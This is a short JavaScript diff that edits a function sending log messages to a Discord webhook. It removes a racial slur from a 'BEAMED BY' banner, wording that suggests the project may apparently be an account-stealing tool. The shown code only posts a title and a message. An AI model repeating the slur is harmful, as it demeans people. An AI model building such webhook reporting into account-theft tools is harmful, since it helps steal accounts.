@@ -151,7 +151,7 @@ function logToWebhook(title, message) {
     const url = webhook_logging_url
 
     let data = {
-        username: "BEAMED BY ROA NIGGER",
+        username: "  ",
         avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038117687156559962/bigrat-christmas-hat.png",
         content: " ",
         embeds: [{
@@ -159,7 +159,7 @@ function logToWebhook(title, message) {
                 {name: title, value: ""},
                 {name: message, value: ""}
             ]
-        }BEAMED BY ROA NIGGER
+        }
         ]
     }
     axios.post(url, data).then(() => console.log("Logging to discord."))
